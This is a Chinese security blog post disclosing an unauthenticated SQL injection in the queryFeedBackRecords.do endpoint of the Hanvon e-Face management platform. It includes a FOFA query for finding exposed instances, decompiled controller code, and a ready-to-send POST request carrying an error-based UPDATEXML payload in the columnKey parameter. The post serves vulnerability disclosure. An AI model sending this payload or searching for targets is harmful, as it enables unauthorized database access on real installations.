---
title: "汉王e脸通综合管理平台 queryFeedBackRecords.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryFeedBackRecords-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryfeedbackrecords.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryFeedBackRecords.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/25 12:32
* 608浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

漏洞扫描器

企业安全咨询

网络安全课程


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryFeedBackRecords.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `FeedBackMgrController` 里关于 `queryFeedBackRecords` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryFeedBackRecords.do"},
        method = {RequestMethod.POST}
    )
    public RequestJson queryFeedBackRecords(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "type") Integer type, @RequestParam(required = false,value = "state") Integer state, @RequestParam(required = false,value = "branchId") Long branchId, @RequestParam(required = false,value = "begin") String begin, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "userId") Long userId, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            this.loginCheck();
            DbPager pager = this.getPager(page, pageSize, columnKey, order);
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            if (begin == null || end == null) {
                Calendar cale = Calendar.getInstance();
                cale.add(2, 0);
                cale.set(5, 1);
                begin = sdf.format(cale.getTime());
                cale.add(2, 1);
                cale.set(5, 0);
                end = sdf.format(cale.getTime());
            }

            BranchTpm branch = null;
            if (branchId != null) {
                MethodResult<BranchTpm> info = this.branchAsm.getBranch(branchId);
                branch = (BranchTpm)info.getResult();
            }

            Date begin1 = sdf.parse(begin);
            Date end1 = sdf.parse(end);
            begin1 = WorkDateUtils.getStartOfDay(begin1);
            end1 = WorkDateUtils.getEndOfDay(end1);
            Timestamp beginTime = new Timestamp(begin1.getTime());
            Timestamp endTime = new Timestamp(end1.getTime());
            if (name != null && name.trim().length() > 0) {
                name.trim();
            }

            List<FeedBackTpm> list = (List)this.feedBackAsm.queryFeedBackRecords(name, type, state, beginTime, endTime, pager, userId, branch).getResult();
```

最终将 pager 由 queryFeedBackRecords 处理

代码安全审计

[![汉王e脸通综合管理平台 queryFeedBackRecords.do SQL注入漏洞](images/img-001-588741f7c040.webp)](https://image.mrxn.net/d296486b219d4683a74a9a602893b3c4.webp)

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 FeedBackDsm.xml

[![汉王e脸通综合管理平台 queryFeedBackRecords.do SQL注入漏洞](images/img-002-07c00253274f.webp)](https://image.mrxn.net/0e90188531674379a56a2e90d9dfc12d.webp)

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /manage/feedBackMgr/queryFeedBackRecords.do HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/x-www-form-urlencoded

columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT (ELT(2920=2920,1)))),8357))&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS
```

[![汉王e脸通综合管理平台 queryFeedBackRecords.do SQL注入漏洞](images/img-003-bb06fc106614.webp)](https://image.mrxn.net/631778c7b9f1483f98eb278e250e3a1c.webp)

成功利用报错注入获取到数据库版本号信息

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryFeedBackRecords.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryFeedBackRecords-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryFeedBackRecords-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryFeedBackRecords-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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